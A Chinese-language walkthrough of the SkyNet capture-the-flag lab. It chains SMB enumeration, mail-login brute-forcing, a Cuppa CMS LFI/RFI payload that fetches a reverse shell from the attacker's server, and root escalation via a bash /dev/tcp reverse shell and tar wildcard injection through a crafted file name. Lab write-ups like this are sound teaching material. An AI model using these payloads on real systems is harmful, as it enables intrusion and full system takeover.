# SkyNet

一个易受攻击的终结者主题Linux机器。

---

循例 nmap 扫

    22/tcp  open  ssh
    80/tcp  open  http
    110/tcp open  pop3
    139/tcp open  netbios-ssn
    143/tcp open  imap
    445/tcp open  microsoft-ds

web貌似没东西，扫一下

顺便看一下smb的anonymous下有没有东西，有四个文件

其中log2和log3都是空文件

attention.txt文件告诉我们系统出现漏洞，许多用户密码被更改，并且出现了疑似管理员的名字：miles dyson

log1.txt文件疑似密码表

---

看一下gobuster的扫描结果

其中有权访问的：

    /squirrelmail

进入这个页面跳转到了一个登录页面，

疑似cms版本

    SquirrelMail version 1.4.23 [SVN]

根据密码表，使用burp尝试爆破admin，无果，

想起刚刚的miles dyson，尝试爆破，成功

    cyborg007haloterminator

里面有几封关于miles dyson的邮件，其中一封包含他的smb密码

<pre><font color="#367BF0">┌──(</font><font color="#EC0101"><b>root💀kali</b></font><font color="#367BF0">)-[</font><b>/home/sugobet</b><font color="#367BF0">]</font>
<font color="#367BF0">└─</font><font color="#EC0101"><b>#</b></font> <font color="#5EBDAB">smbclient</font> //10.10.107.156/milesdyson <font color="#9755B3">-U</font> milesdyson
</pre>

在notes文件夹中有一大堆的markdown文件，但入目眼帘的是一个独一无二的txt文件：

    importent.txt

包含内容：

    1. Add features to beta CMS /45kra24zxs28v3yd
    2. Work on T-800 Model 101 blueprints
    3. Spend more time with my wife

该网页是他的主页：

    Miles Dyson个人主页

    迈尔斯·班尼特·戴森博士是神经网络处理器的发明者这导致了天网的发展
    一个计算机人工智能旨在控制电子链接武器并保卫美国。

到这里就没了，只好尝试对/45kra24zxs28v3yd进行扫描，还真扫出了一个登录页面：

    /administrator

尝试了之前的账号和密码，失败

看到是一个Cuppa CMS 去搜索有没有相关的cve

<pre><font color="#367BF0">┌──(</font><font color="#EC0101"><b>root💀kali</b></font><font color="#367BF0">)-[</font><b>/home/sugobet</b><font color="#367BF0">]</font>
<font color="#367BF0">└─</font><font color="#EC0101"><b>#</b></font> <font color="#5EBDAB">searchsploit</font> Cuppa CMS</pre>

存在一个LFI/RFI漏洞

虽然我们不知道任何版本信息，但此时我们别无选择，放手一搏吧

POC:

    http://10.10.107.156/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd

成功回显passwd

尝试RFI进行reverse shell:

攻击机：

    python3 -m http.server 8000

    新建窗口：nc -vlnp 8888

payload:

    http://10.10.107.156/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.11.17.14:8000/linux-tools_and_exp/rev_she11.php

成功getshell

升级shell

    python3 -c "import pty;pty.spawn('/bin/bash')"

在milesdyson的用户文件夹中发现了backups文件夹里面有一个shell文件：

    #!/bin/bash
    cd /var/www/html
    tar cf /home/milesdyson/backups/backup.tgz *

该文件夹下还有有个tgz文件，并且我发现每分钟都在读写

很明显了，这是一个定时任务

cat /etc/crontab:

    */1 *	* * *   root	/home/milesdyson/backups/backup.sh

很好，还是root权限执行，我们利用tar通配符注入尝试getroot

    cd /var/www/html
    touch ./reverse_shell.sh
    echo "/bin/bash -i >& /dev/tcp/10.11.17.14/8889 0>&1" > ./reverse_shell.sh
    echo ""  > "--checkpoint-action=exec=bash reverse_shell.sh"

成功getroot

<pre>Ncat: Connection from 10.10.15.88.
Ncat: Connection from 10.10.15.88:46754.
bash: cannot set terminal process group (2246): Inappropriate ioctl for device
bash: no job control in this shell
root@skynet:/var/www/html# whoami
whoami
root
</pre>
